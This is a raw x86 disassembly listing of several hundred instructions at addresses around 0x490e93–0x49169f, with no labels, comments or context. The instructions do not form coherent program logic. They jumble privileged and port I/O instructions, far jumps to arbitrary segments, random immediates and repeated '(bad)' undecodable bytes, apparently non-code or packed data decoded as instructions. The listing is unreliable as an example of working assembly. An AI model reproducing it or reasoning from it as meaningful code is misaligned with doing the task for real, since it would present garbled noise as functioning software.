  490e93:	push   0x32
  490e95:	jo     0x490ed7
  490e97:	pop    edx
  490e98:	ret    0x7dd8
  490e9b:	out    dx,eax
  490e9c:	adc    bl,ch
  490e9e:	mov    eax,ss:0xb881163c
  490ea4:	and    edx,DWORD PTR [eax+0x45]
  490ea7:	cli    
  490ea8:	std    
  490ea9:	mov    bl,0xfb
  490eab:	jbe    0x490e66
  490ead:	or     eax,DWORD PTR [ecx]
  490eaf:	inc    edi
  490eb0:	mov    BYTE PTR [eax],bl
  490eb2:	jne    0x490e90
  490eb4:	cmp    DWORD PTR [eax+0x760e0e74],0xffffffd3
  490ebb:	shr    DWORD PTR [ebp+edx*8-0x174f5f43],0x14
  490ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490ec4:	inc    esp
  490ec5:	iret   
  490ec6:	les    ecx,FWORD PTR [edi-0xfa983f5]
  490ecc:	or     BYTE PTR [edx-0x5e],ch
  490ecf:	push   esp
  490ed0:	les    eax,FWORD PTR [ebx+0x2e]
  490ed3:	fbld   TBYTE PTR [edi]
  490ed5:	pop    ecx
  490ed6:	and    BYTE PTR [esp+ebx*1+0x10],ch
  490eda:	jne    0x490f43
  490edc:	enter  0xda68,0x97
  490ee0:	fistp  DWORD PTR [edx+0x1b79309d]
  490ee6:	jmp    0x3cce:0x86c02053
  490eed:	dec    esp
  490eee:	mov    ds:0xc1be5c28,eax
  490ef3:	pop    ds
  490ef4:	inc    edi
  490ef5:	in     eax,0x80
  490ef7:	mov    ds:0xe44ac290,eax
  490efc:	ror    BYTE PTR [eax],cl
  490efe:	lods   al,BYTE PTR ds:[esi]
  490eff:	enter  0x8be5,0x20
  490f03:	loop   0x490ea5
  490f05:	or     DWORD PTR [edi+0x18],ebp
  490f08:	push   ebp
  490f09:	fs jmp 0x490f1c
  490f0c:	pop    ecx
  490f0d:	push   ss
  490f0e:	popf   
  490f0f:	loop   0x490f70
  490f11:	cld    
  490f12:	aaa    
  490f13:	inc    edi
  490f14:	pop    edx
  490f15:	test   BYTE PTR [ebp-0x3c],0x1
  490f19:	je     0x490f21
  490f1b:	mov    cs,eax
  490f1d:	jmp    0x490f22
  490f1f:	push   0xa
  490f21:	pop    ecx
  490f22:	shr    BYTE PTR [edi-0x30],0x69
  490f26:	inc    edx
  490f27:	push   0xc600a096
  490f2c:	lods   al,BYTE PTR ds:[esi]
  490f2d:	ja     0x490eea
  490f2f:	add    eax,0xc639ee4d
  490f34:	jne    0x490f3c
  490f36:	pop    edi
  490f37:	or     dh,dl
  490f39:	imul   eax,DWORD PTR [edx],0x40442eeb
  490f3f:	xchg   BYTE PTR [edx-0x31],bl
  490f42:	fsubr  QWORD PTR [edx]
  490f44:	mov    bh,0x45
  490f46:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  490f48:	pop    esp
  490f49:	push   edx
  490f4a:	in     al,0x0
  490f4c:	pop    edi
  490f4d:	in     al,dx
  490f4e:	adc    DWORD PTR [ebx+0x5002538],edx
  490f54:	mov    esi,0x8625e3c0
  490f59:	fucom  st(5)
  490f5b:	fcom   DWORD PTR [eax+edx*2-0x46]
  490f5f:	and    BYTE PTR [edi],cl
  490f61:	mov    cl,BYTE PTR [ecx]
  490f63:	fild   WORD PTR [eax+0x67]
  490f66:	imul   ebx,DWORD PTR [esi+0x56],0x1e
  490f6a:	push   esp
  490f6b:	push   ax
  490f6d:	addr16 aam 0x66
  490f70:	or     DWORD PTR fs:[edx],eax
  490f73:	add    BYTE PTR es:[edi-0x20994bfa],bl
  490f7a:	sub    esp,esp
  490f7c:	push   ebp
  490f7d:	jb     0x490fbf
  490f7f:	addr16 inc eax
  490f81:	addr16 jns 0x490f22
  490f84:	imul   DWORD PTR [esi-0x79]
  490f87:	aaa    
  490f88:	or     al,0x24
  490f8a:	push   es
  490f8b:	sbb    al,0x14
  490f8d:	or     al,0x13
  490f8f:	or     ch,0xe7
  490f92:	add    al,0xfc
  490f94:	data16 hlt 
  490f96:	data16 fistp WORD PTR [edx]
  490f99:	jl     0x490ff3
  490f9b:	add    BYTE PTR [ebx],bl
  490f9d:	(bad)  
  490f9e:	jmp    0xe04dd4fb
  490fa3:	repz push es
  490fa5:	fs js  0x49100f
  490fa8:	fist   WORD PTR [eax]
  490faa:	jb     0x490f3c
  490fac:	push   edi
  490fad:	fsubr  QWORD PTR [eax-0x74]
  490fb0:	push   0xe53b0e7c
  490fb5:	loopne 0x49101e
  490fb7:	pop    ecx
  490fb8:	nop
  490fb9:	lock movups xmm7,XMMWORD PTR [eax+ebp*2]
  490fbe:	and    BYTE PTR [edi],ah
  490fc0:	call   0x8b6e:0x68dcdf00
  490fc7:	nop
  490fc8:	pop    ss
  490fc9:	fsubr  QWORD PTR [eax-0x49]
  490fcc:	nop
  490fcd:	out    0x79,eax
  490fcf:	sahf   
  490fd0:	test   DWORD PTR [eax+ebx*4],0xb0a8a006
  490fd7:	mov    eax,0x9f002600
  490fdc:	rcl    bl,0x68
  490fdf:	fistp  WORD PTR [ebx+0x47b0cdef]
  490fe5:	in     al,dx
  490fe6:	or     dh,ah
  490fe8:	push   es
  490fe9:	add    al,0x69
  490feb:	sbb    BYTE PTR [ecx-0x48],ch
  490fee:	add    ah,BYTE PTR [esi]
  490ff0:	add    bh,bl
  490ff2:	push   ecx
  490ff3:	sub    BYTE PTR [ecx-0x3e],0xa
  490ff7:	push   esi
  490ff8:	dec    edx
  490ff9:	adc    BYTE PTR [eax],al
  490ffb:	dec    ebp
  490ffc:	popf   
  490ffd:	sbb    al,0xd4
  490fff:	imul   esp,eax,0xffffff8e
  491002:	sti    
  491003:	loopne 0x491031
  491005:	jecxz  0x49102d
  491007:	pop    esp
  491008:	lea    esi,[ebx-0x4]
  49100b:	div    cl
  49100d:	fs loopne 0x491077
  491010:	sub    ecx,DWORD PTR [edx-0x219136f0]
  491016:	jg     0x490fbf
  491018:	mov    eax,0xfc513a52
  49101d:	jne    0x49106c
  49101f:	mov    dl,BYTE PTR [eax-0x3]
  491022:	push   ss
  491023:	cmp    al,0xfd
  491025:	jne    0x49105e
  491027:	sahf   
  491028:	out    0xe6,al
  49102a:	imul   edi,esi,0x2175fe26
  491030:	call   DWORD PTR [eax]
  491032:	push   edi
  491033:	xchg   ebp,eax
  491034:	xchg   ebx,eax
  491035:	push   0x4c0a8ff
  49103a:	dec    eax
  49103b:	imul   DWORD PTR [edx]
  49103d:	retf   0xfc75
  491040:	jb     0x491004
  491042:	xor    bl,BYTE PTR [ebx-0x15]
  491045:	inc    esi
  491046:	adc    bh,BYTE PTR [ecx+0x7e]
  491049:	sahf   
  49104a:	lahf   
  49104b:	(bad)  
  49104c:	(bad)  
  49104d:	jmp    0x49108b
  49104f:	std    
  491050:	std    
  491051:	jmp    0x491085
  491053:	cld    
  491054:	xor    eax,0xfceb33d5
  491059:	sub    bl,bl
  49105b:	jmp    0x9fff:0xc23a0d14
  491062:	in     al,0x90
  491064:	adc    DWORD PTR [edx],edi
  491066:	adc    DWORD PTR [ebp+0xd],esi
  491069:	inc    eax
  49106a:	inc    esi
  49106b:	inc    ecx
  49106c:	cmp    esi,ebx
  49106e:	jb     0x49105f
  491070:	inc    ebx
  491071:	mov    al,ds:0x8519e806
  491076:	xchg   edx,eax
  491077:	repnz fcmovb st,st(4)
  49107a:	push   cs
  49107b:	add    eax,0x850f4610
  491080:	mov    ch,0x80
  491082:	jg     0x491029
  491084:	jmp    0xeac1:0x7fe183c1
  49108b:	pop    es
  49108c:	je     0x4910f3
  49108e:	ror    ebp,0xe7
  491091:	sti    
  491092:	jle    0x4910fa
  491094:	movq   mm0,QWORD PTR [esi]
  491097:	push   es
  491098:	dec    esi
  491099:	adc    BYTE PTR [eax],cl
  49109b:	push   esi
  49109c:	and    BYTE PTR [esi+0x30],bl
  49109f:	jg     0x491090
  4910a1:	out    0xf3,eax
  4910a3:	mov    ebp,0x244f0607
  4910a8:	jg     0x491101
  4910aa:	jg     0x49110b
  4910ac:	outs   dx,DWORD PTR ds:[esi]
  4910ad:	inc    ax
  4910af:	or     BYTE PTR [esi-0x31],ch
  4910b2:	idiv   DWORD PTR [esi]
  4910b4:	lahf   
  4910b5:	push   eax
  4910b6:	jbe    0x491118
  4910b8:	jle    0x49112a
  4910ba:	xor    BYTE PTR [edi+0x26],ah
  4910bd:	jg     0x49112e
  4910bf:	jg     0x491079
  4910c1:	fucomi st,st(3)
  4910c3:	lahf   
  4910c4:	ja     0x491145
  4910c6:	jg     0x491138
  4910c8:	lea    esi,[esi+0xbbf8ddd]
  4910ce:	dec    edx
  4910cf:	jne    0x491074
  4910d1:	cmp    eax,0xf2556643
  4910d6:	dec    ecx
  4910d7:	in     al,0xde
  4910d9:	pop    esp
  4910da:	pop    ss
  4910db:	cs push 0xc0dfadff
  4910e1:	lea    esi,[esi+0x10]
  4910e4:	lea    edi,[edi+0x10]
  4910e7:	inc    esi
  4910e8:	out    dx,eax
  4910e9:	and    BYTE PTR [edi],cl
  4910eb:	je     0x491111
  4910ed:	adc    cl,BYTE PTR [esi-0x38ffedf]
  4910f3:	or     eax,0x8d69bc44
  4910f8:	xor    al,0x17
  4910fa:	xor    BYTE PTR [esp+eax*1],al
  4910fd:	dec    ecx
  4910fe:	jne    0x4910f3
  491100:	add    al,0x6c
  491102:	cmp    edi,ebp
  491104:	sbb    al,0x3
  491106:	je     0x491111
  491108:	jae    0x491150
  49110a:	inc    edi
  49110b:	push   ds
  49110c:	neg    DWORD PTR [eax-0x2]
  49110f:	push   es
  491110:	add    al,0x3a
  491112:	add    al,bl
  491114:	cmp    DWORD PTR [ebx],ebp
  491116:	shr    BYTE PTR [ebx],1
  491118:	retf   0x8b51
  49111b:	ret    0xd839
  49111e:	retf   
  49111f:	ret    
  491120:	inc    ecx
  491121:	push   ss
  491122:	mov    BYTE PTR [edi],dl
  491124:	shr    eax,0x85
  491127:	dec    eax
  491128:	clc    
  491129:	add    ah,dl
  49112b:	mov    ds:0x48fb5359,al
  491130:	push   esp
  491131:	pop    edx
  491132:	xchg   BYTE PTR [ebx],al
  491134:	push   ss
  491135:	in     al,0x4
  491137:	ds jg  0x49113d
  49113a:	xor    BYTE PTR [edi],0x41
  49113d:	xor    esi,esi
  49113f:	cmp    eax,0x8559f88b
  491144:	(bad)  
  491145:	jg     0x491147
  491147:	mov    edx,0x392775f9
  49114c:	add    eax,0x561f7698
  491151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491152:	lea    eax,[esi-0x584cf584]
  491158:	call   0x3724d29
  49115d:	mov    ?,eax
  49115f:	fsub   DWORD PTR [ebx-0x35a5f790]
  491165:	add    eax,0x453b0c89
  49116a:	(bad)  
  49116b:	push   ebx
  49116c:	out    0x73,al
  49116e:	xchg   edx,eax
  49116f:	pop    ebx
  491170:	enter  0xec11,0x56
  491174:	xchg   edi,eax
  491175:	ret    
  491176:	xchg   ebx,eax
  491177:	or     al,0x35
  491179:	sbb    BYTE PTR [ebp+esi*8+0x26],cl
  49117d:	sub    DWORD PTR [esi+ecx*4],ebp
  491180:	in     al,0x2
  491182:	push   esi
  491183:	xor    al,0x74
  491185:	fwait
  491186:	rcl    DWORD PTR [eax],0x90
  491189:	outs   dx,BYTE PTR ds:[esi]
  49118a:	repnz or BYTE PTR ds:0x10a3a2e7,dh
  491191:	(bad)  
  491192:	ret    0x2192
  491195:	mov    ebp,0x2094038c
  49119a:	es cmc 
  49119c:	add    ebx,DWORD PTR [edi]
  49119e:	and    ecx,DWORD PTR [esi]
  4911a0:	add    ebx,DWORD PTR [eax-0x2e]
  4911a3:	pop    es
  4911a4:	push   0x59546cd0
  4911a9:	cwde   
  4911aa:	add    DWORD PTR [eax+0x36],ebx
  4911ad:	cmc    
  4911ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4911af:	and    al,0x56
  4911b1:	xchg   ebp,eax
  4911b2:	sahf   
  4911b3:	(bad)  
  4911b4:	ins    BYTE PTR es:[edi],dx
  4911b5:	push   es
  4911b6:	lea    ebp,[ebx]
  4911b8:	push   esi
  4911b9:	push   edi
  4911ba:	mov    WORD PTR [ecx+0x312b7517],es
  4911c0:	(bad)  
  4911c1:	xor    eax,ebp
  4911c3:	push   eax
  4911c4:	mov    eax,edx
  4911c6:	and    DWORD PTR [edx],edx
  4911c8:	popa   
  4911c9:	add    BYTE PTR [edx+0x41071adf],dl
  4911cf:	fwait
  4911d0:	add    eax,0x5ba36456
  4911d5:	pop    edi
  4911d6:	add    al,0x76
  4911d8:	fisttp DWORD PTR [ebp+0x12]
  4911db:	mov    DWORD PTR ds:0x8b5f5915,ecx
  4911e1:	sbb    BYTE PTR [ebx],ch
  4911e3:	mov    BYTE PTR [eax+0x20f5c151],dh
  4911e9:	mov    bl,ah
  4911eb:	aas    
  4911ec:	fnstenv [ebx+0x8]
  4911ef:	xor    esi,DWORD PTR ds:0x4806e8a7
  4911f5:	cmp    al,0x25
  4911f7:	dec    esi
  4911f8:	cs loope 0x491188
  4911fb:	jnp    0x49120d
  4911fd:	in     eax,dx
  4911fe:	xor    BYTE PTR [eax+0x4e3472e3],dh
  491204:	add    al,0x74
  491206:	or     al,0x38
  491208:	pop    edx
  491209:	sti    
  49120a:	push   esi
  49120b:	dec    edi
  49120c:	or     DWORD PTR [ebx-0x7be0f74a],0xa06f4b13
  491216:	test   BYTE PTR [eax+0x4],0x66
  49121a:	call   0x9ac2:0x5dc6564
  491221:	jp     0x4911ac
  491223:	push   ebx
  491224:	cld    
  491225:	test   eax,0xda9e825e
  49122a:	inc    ebp
  49122b:	retf   0xb0d8
  49122e:	xlat   BYTE PTR ss:[ebx]
  491230:	stos   DWORD PTR es:[edi],eax
  491231:	sbb    BYTE PTR [edi+0x76],0xee
  491235:	cld    
  491236:	dec    esp
  491237:	xchg   BYTE PTR [ecx+eax*1-0x79a77a78],cl
  49123e:	adc    BYTE PTR [eax+0x68d060b5],bl
  491244:	fmul   st(0),st
  491246:	mov    ah,0xa0
  491248:	add    DWORD PTR [ecx-0x7f],esi
  49124b:	fdivp  st(6),st
  49124d:	call   0x7f899653
  491252:	inc    edi
  491253:	inc    esi
  491254:	inc    edi
  491255:	addr16 or edi,ebx
  491258:	fsubr  st,st(2)
  49125a:	jne    0x49122a
  49125c:	mov    al,al
  49125e:	push   es
  49125f:	dec    esi
  491260:	adc    eax,DWORD PTR cs:[eax*1+0x3cf43a56]
  491268:	test   DWORD PTR [esp+eax*1-0x740e43b9],ecx
  49126f:	loope  0x49129e
  491271:	mov    DWORD PTR [eax+0x73633981],ebp
  491277:	ins    DWORD PTR es:[edi],dx
  491278:	loopne 0x4912ea
  49127a:	pop    ebx
  49127b:	popa   
  49127c:	daa    
  49127d:	add    bh,BYTE PTR ds:0x68208320
  491283:	cmovns ebx,DWORD PTR [esi+esi*2+0x4a]
  491288:	fdiv   QWORD PTR [esi+0x6c]
  49128b:	(bad)  
  49128d:	test   BYTE PTR [esp+ebx*4],al
  491290:	jnp    0x4912a0
  491292:	das    
  491293:	and    al,0xac
  491295:	test   DWORD PTR [ebx],edi
  491297:	dec    ecx
  491298:	and    BYTE PTR [edx],0x9e
  49129b:	int    0xb0
  49129d:	jecxz  0x4912cd
  49129f:	aam    0xc
  4912a1:	cmp    DWORD PTR [eax+0x7e],ebx
  4912a4:	adc    ch,BYTE PTR [eax+0x29]
  4912a7:	rcl    DWORD PTR [eax+0xa],cl
  4912aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4912ab:	xor    esp,DWORD PTR [edx+0x2d]
  4912ae:	inc    edi
  4912af:	loop   0x4912d7
  4912b1:	and    BYTE PTR [eax],dh
  4912b3:	or     ah,ah
  4912b5:	sub    esi,eax
  4912b7:	sub    eax,0x64264776
  4912bc:	xlat   BYTE PTR ds:[ebx]
  4912bd:	jae    0x4912d4
  4912bf:	mov    edx,0x5dbb3937
  4912c4:	and    eax,0x4fb8538c
  4912c9:	adc    BYTE PTR [ebp-0x6a155635],ch
  4912cf:	cmc    
  4912d0:	rcl    esp,cl
  4912d2:	pop    ebp
  4912d3:	je     0x491302
  4912d5:	bnd je 0x4912fa
  4912d8:	mov    BYTE PTR ds:[esi+0x8deb412],ah
  4912df:	or     eax,0x9a770358
  4912e4:	push   eax
  4912e5:	lahf   
  4912e6:	loop   0x4912a0
  4912e8:	add    al,0xba
  4912ea:	or     dl,BYTE PTR [edx]
  4912ec:	push   ss
  4912ed:	test   esp,esi
  4912ef:	cmp    BYTE PTR [ebp-0x74feef8],dl
  4912f5:	mov    dl,0xf1
  4912f7:	ins    BYTE PTR es:[edi],dx
  4912f8:	jmp    0x491362
  4912fa:	add    esp,ebp
  4912fc:	jmp    DWORD PTR [edi*2+0x57daa840]
  491303:	out    dx,eax
  491304:	or     ebp,DWORD PTR [esi-0x40]
  491307:	jne    0x49137b
  491309:	enter  0x5224,0x2
  49130d:	(bad)  
  49130f:	outs   dx,DWORD PTR ds:[esi]
  491310:	rol    ecx,cl
  491312:	loope  0x491324
  491314:	or     eax,ecx
  491316:	lea    edi,[esi+0x10]
  491319:	stos   DWORD PTR es:[edi],eax
  49131a:	add    BYTE PTR [ecx+0x37eefee0],bh
  491320:	push   edx
  491321:	xchg   esp,eax
  491322:	nop
  491323:	pop    eax
  491324:	sub    ecx,esi
  491326:	mov    edi,0x1148a71
  49132b:	mov    BYTE PTR [eax],dl
  49132d:	inc    eax
  49132e:	dec    edi
  49132f:	mov    esi,0xfca912d7
  491334:	xchg   dh,ah
  491336:	mov    esi,0x82700
  49133b:	push   ss
  49133c:	cmp    BYTE PTR [ecx+0x4e],0x97
  491340:	add    DWORD PTR [eax],edi
  491342:	jno    0x491350
  491344:	daa    
  491345:	out    0x4c,al
  491347:	sub    eax,0x1e0b4600
  49134c:	test   eax,ebp
  49134e:	fcom   QWORD PTR [ebx-0x1c]
  491351:	pop    edx
  491352:	ins    BYTE PTR es:[edi],dx
  491353:	push   eax
  491354:	call   DWORD PTR [esp+eiz*2+0x5c]
  491358:	mov    edi,0xd086e86f
  49135d:	mov    bl,0xe8
  49135f:	cld    
  491360:	mov    bh,0x88
  491362:	test   BYTE PTR ds:0xd1817bee,al
  491368:	cmovo  ebp,DWORD PTR [esp+esi*8+0x54ee858a]
  491370:	mov    BYTE PTR [ebp+0xbd4c621],0xa1
  491377:	and    BYTE PTR [edx+0x30],cl
  49137a:	lea    ebx,[ebp-0x447a1a11]
  491380:	push   DWORD PTR [edi+0x3b0304c8]
  491386:	enter  0x1677,0x2b
  49138a:	rol    DWORD PTR [eax+0x50],0x8d
  49138e:	xchg   esp,eax
  49138f:	or     eax,0x52206a3f
  491394:	dec    ecx
  491395:	add    ah,al
  491397:	mov    edi,DWORD PTR [edi-0x76]
  49139a:	inc    ebx
  49139b:	add    DWORD PTR [ebp+edi*4+0x3c753ed3],edx
  4913a2:	(bad)  
  4913a3:	cmp    BYTE PTR [esi+0xc],dh
  4913a6:	loopne 0x4913a4
  4913a8:	ficom  WORD PTR [eax+0x7e]
  4913ab:	push   cs
  4913ac:	add    ch,bl
  4913ae:	not    BYTE PTR [ebp+0x50]
  4913b1:	jmp    0xdb7d0b9e
  4913b6:	push   ebx
  4913b7:	icebp  
  4913b8:	mov    ?,WORD PTR ds:0xfd2a2eef
  4913be:	push   edi
  4913bf:	cmp    eax,0x6536857
  4913c4:	in     al,0x36
  4913c6:	adc    eax,0xfc4144f1
  4913cb:	push   0x6f6b876
  4913d0:	cmp    al,0x49
  4913d2:	and    al,0x6f
  4913d4:	mov    WORD PTR [ebp-0x5],es
  4913d7:	push   DWORD PTR [eax]
  4913d9:	in     eax,0xcd
  4913db:	fimul  DWORD PTR [esi]
  4913dd:	or     BYTE PTR [esi+eax*1+0x1d],0x10
  4913e2:	mov    cl,BYTE PTR [ebp+eax*1+0x31dd29ad]
  4913e9:	mov    cl,0xeb
  4913eb:	adc    DWORD PTR [esi],ebx
  4913ed:	adc    eax,0xfbc12025
  4913f2:	inc    ebx
  4913f3:	not    BYTE PTR [eax-0x49e97378]
  4913f9:	pop    es
  4913fa:	mov    BYTE PTR [ecx+edx*1+0x67bea4d7],bl
  491401:	mov    eax,0x8d52ebbf
  491406:	mov    DWORD PTR [ebp-0x60731c],0xfbf7777d
  491410:	mov    dl,0x29
  491412:	pop    ss
  491413:	mov    edx,DWORD PTR [ebp+0xe848d0b]
  491419:	cmp    eax,0x5a8dd003
  49141e:	and    BYTE PTR [edi+edi*4+0x19263769],dh
  491425:	ja     0x491431
  491427:	enter  0x8d0e,0x51
  49142b:	and    bl,ch
  49142d:	or     eax,0xc1cfa83
  491432:	inc    eax
  491433:	mov    ebx,0xe020a9a1
  491438:	cld    
  491439:	jmp    0x49143e
  49143b:	(bad)  
  49143c:	dec    esi
  49143d:	inc    ecx
  49143e:	adc    BYTE PTR [edi+0x0],0x95
  491442:	push   0x335f6ac6
  491447:	int    0x5b
  491449:	xor    BYTE PTR [ecx+ecx*1],0x29
  49144d:	outs   dx,DWORD PTR ds:[esi]
  49144e:	push   cs
  49144f:	call   0x809924ca
  491454:	xor    BYTE PTR [ecx-0x418fb8bb],ah
  49145a:	(bad)  
  49145b:	ins    BYTE PTR es:[edi],dx
  49145c:	xor    bl,BYTE PTR [edx+0x7f]
  49145f:	ins    BYTE PTR es:[edi],dx
  491460:	ja     0x4914ca
  491462:	test   esi,esi
  491464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491465:	and    BYTE PTR [eax],dh
  491467:	xor    ecx,esi
  491469:	xor    ecx,ebp
  49146b:	mov    eax,esi
  49146d:	std    
  49146e:	or     eax,0x46371bb
  491473:	sub    eax,DWORD PTR [edx+edi*2+0x3b]
  491477:	xor    eax,0x107568a
  49147c:	iret   
  49147d:	outs   dx,BYTE PTR ss:[esi]
  49147f:	ins    BYTE PTR es:[edi],dx
  491480:	cmp    al,0xc0
  491482:	aam    0x92
  491484:	js     0x4914a7
  491486:	int    0xf
  491488:	cmp    esi,0x3d0a0873
  49148e:	dec    edx
  49148f:	push   0xde70a19f
  491494:	mov    ebp,0x47894977
  491499:	push   0x546c5b8b
  49149e:	je     0x491482
  4914a0:	fstp   DWORD PTR [edi]
  4914a2:	xchg   ebp,eax
  4914a3:	mov    ebx,0x8eeb1961
  4914a8:	mov    ebp,DWORD PTR [esi]
  4914aa:	rcr    DWORD PTR [esi],0x6
  4914ad:	add    DWORD PTR [edi-0x42],esp
  4914b0:	sti    
  4914b1:	xor    ebx,ebx
  4914b3:	push   ebx
  4914b4:	add    DWORD PTR [eax],ecx
  4914b6:	dec    ecx
  4914b7:	dec    esp
  4914b8:	cmp    bh,BYTE PTR [eax-0x47]
  4914bb:	stos   DWORD PTR es:[edi],eax
  4914bc:	push   ds
  4914bd:	loop   0x4914bd
  4914bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4914c0:	push   ds
  4914c1:	mov    DWORD PTR ds:0x2174b515,0x647674e0
  4914cb:	add    al,BYTE PTR [ebp+0x3]
  4914ce:	jb     0x49150b
  4914d0:	and    eax,0x443ceb1f
  4914d5:	std    
  4914d6:	jne    0x4914ea
  4914d8:	pusha  
  4914d9:	cs daa 
  4914db:	sar    DWORD PTR [esi],cl
  4914dd:	jmp    0x4914ba
  4914df:	sub    al,0xfc
  4914e1:	cdq    
  4914e2:	retf   0x42ac
  4914e5:	shr    BYTE PTR [ecx+0x39],0xeb
  4914e9:	les    edi,FWORD PTR [ebx-0x76]
  4914ec:	mov    es,WORD PTR [ebx+0x12]
  4914ef:	ror    bh,1
  4914f1:	and    BYTE PTR [ecx-0x1a],bl
  4914f4:	ret    
  4914f5:	pushf  
  4914f6:	(bad)  
  4914f7:	xchg   ecx,eax
  4914f8:	push   edi
  4914f9:	pop    esp
  4914fa:	popa   
  4914fb:	and    al,BYTE PTR [ecx-0x7defcf38]
  491501:	add    al,0xe
  491503:	mov    al,0x21
  491505:	jle    0x49156a
  491507:	push   cs
  491508:	mov    ebx,DWORD PTR [edx]
  49150a:	pop    esi
  49150b:	mov    ah,BYTE PTR [ecx]
  49150d:	arpl   WORD PTR [eax-0x80],di
  491510:	rol    DWORD PTR [esi+0x61],0xb0
  491514:	add    BYTE PTR [eax+0x2020c610],bh
  49151a:	xor    BYTE PTR [esi],ch
  49151c:	lahf   
  49151d:	push   ss
  49151e:	push   esi
  49151f:	rcl    DWORD PTR [edi+0x2e3dae2a],0x72
  491526:	out    0x81,eax
  491528:	into   
  491529:	std    
  49152a:	fs pop edx
  49152c:	call   0xf0e9:0x16742e39
  491533:	mov    bl,0x4c
  491535:	test   DWORD PTR [esi+0x6860c742],ebp
  49153b:	or     cl,BYTE PTR [ecx-0x5]
  49153e:	and    al,0x4e
  491540:	test   dh,bl
  491542:	push   edi
  491543:	and    al,0x5c
  491545:	mov    esp,0x37ceafea
  49154a:	inc    ebx
  49154b:	lea    eax,[ebx+0x1c]
  49154e:	push   esi
  49154f:	aas    
  491550:	rol    BYTE PTR [edx-0x2b],cl
  491553:	add    ebx,ebp
  491555:	sub    BYTE PTR [esi],bh
  491557:	push   ss
  491558:	jae    0x4915b8
  49155a:	add    DWORD PTR [esi+ebx*8+0xfe855be],ebx
  491561:	xchg   BYTE PTR [edi-0x32],ah
  491564:	out    dx,al
  491565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491566:	rcr    ecx,cl
  491568:	clc    
  491569:	fidiv  WORD PTR [edx+0xe8aefb3]
  49156f:	test   cl,cl
  491571:	sbb    bh,BYTE PTR [esi*1+0x4644631d]
  491578:	push   edx
  491579:	leave  
  49157a:	inc    ebx
  49157b:	and    dl,BYTE PTR [ebx-0x723a0c10]
  491581:	mov    ecx,DWORD PTR [ebp-0x1c]
  491584:	imul   ecx,ecx,0x30
  491587:	int3   
  491588:	daa    
  491589:	and    ecx,DWORD PTR [esi+0x71]
  49158c:	lea    esi,[ecx+0x2beb3720]
  491592:	cld    
  491593:	enter  0xfefe,0xb0
  491597:	mov    ch,0x29
  491599:	push   0xebc0043e
  49159e:	fs loopne 0x49152b
  4915a1:	or     BYTE PTR [eax+edi*1],0x8
  4915a5:	inc    esp
  4915a6:	cmp    ebx,DWORD PTR ds:0xffa04374
  4915ac:	call   0xea76:0xf83b4701
  4915b3:	fcom   DWORD PTR [esi-0x80]
  4915b6:	es popa 
  4915b8:	push   ecx
  4915b9:	ins    DWORD PTR es:[edi],dx
  4915ba:	sub    dl,al
  4915bc:	jo     0x491594
  4915be:	(bad)  
  4915bf:	loopne 0x4915b0
  4915c1:	data16 sbb ah,BYTE PTR [eax]
  4915c4:	jge    0x4915a6
  4915c6:	add    al,0x82
  4915c8:	jb     0x4915b3
  4915ca:	mov    eax,edi
  4915cc:	ss popa 
  4915ce:	in     al,dx
  4915cf:	nop
  4915d0:	push   ebx
  4915d1:	test   DWORD PTR [ebx+0x5b],0x916fc06a
  4915d8:	sbb    eax,0x894ef068
  4915dd:	adc    al,0x90
  4915df:	pop    edx
  4915e0:	mov    cx,WORD PTR [edx]
  4915e3:	add    edi,ecx
  4915e5:	xchg   ebp,eax
  4915e6:	dec    esi
  4915e7:	xor    BYTE PTR [ebx+0x2a204ac1],al
  4915ed:	inc    esp
  4915ee:	btr    ebx,0x49
  4915f2:	out    dx,al
  4915f3:	inc    esp
  4915f4:	popa   
  4915f5:	sar    BYTE PTR [esi-0x2e],1
  4915f8:	add    al,0x94
  4915fa:	aad    0xad
  4915fc:	push   ss
  4915fd:	dec    esp
  4915fe:	jbe    0x4915f6
  491600:	mov    ebp,0xf6e0d57e
  491605:	cmp    BYTE PTR [edx+0x1e764630],dh
  49160b:	mov    ecx,0x4f08c9fe
  491610:	and    BYTE PTR [esp+eax*1+0x2af9755e],ch
  491617:	scas   eax,DWORD PTR es:[edi]
  491618:	inc    ecx
  491619:	and    al,0x96
  49161b:	jno    0x4915c7
  49161d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49161e:	shl    BYTE PTR [edx],cl
  491620:	add    DWORD PTR [esi],edx
  491622:	mov    al,ds:0x5567080e
  491627:	jnp    0x491632
  491629:	out    0x5b,al
  49162b:	mov    esp,0x3539a7eb
  491630:	into   
  491631:	adc    BYTE PTR [esi+edi*8-0x77],0x5f
  491636:	rcl    ebx,cl
  491638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491639:	push   cs
  49163a:	pop    esi
  49163b:	adc    DWORD PTR [eax+ebp*2],edx
  49163e:	or     cl,dl
  491640:	enter  0x74d8,0x18
  491644:	mov    eax,esp
  491646:	call   FWORD PTR [ecx]
  491648:	pop    eax
  491649:	fmul   QWORD PTR [ebx-0x80]
  49164c:	dec    eax
  49164d:	push   ecx
  49164e:	mov    ebx,DWORD PTR [edi+0x68]
  491651:	out    0x6f,al
  491653:	fst    DWORD PTR [ebx-0x1d431a48]
  491659:	xchg   ebp,eax
  49165a:	test   al,0xe6
  49165c:	shr    edx,cl
  49165e:	push   0x5b2ee820
  491663:	add    al,bl
  491665:	cli    
  491666:	cmp    ebx,ecx
  491668:	test   esp,0x88b92846
  49166e:	push   es
  49166f:	and    eax,0xa5f3fb8b
  491674:	and    DWORD PTR [ebx],0x0
  491677:	mov    DWORD PTR [ebx+0x63],esp
  49167a:	out    0x58,al
  49167c:	jno    0x49161c
  49167e:	aam    0xe0
  491680:	dec    esp
  491681:	pop    ebp
  491682:	int    0x62
  491684:	test   BYTE PTR [ecx-0x66],0xdc
  491688:	pop    eax
  491689:	push   0x4cc8f14b
  49168e:	jg     0x4916a1
  491690:	mov    eax,DWORD PTR [esi+0x68]
  491693:	cmp    eax,0x5e89504f
  491698:	push   0xd4efda80
  49169d:	aam    0x3d
  49169f:	xor    edi,edi
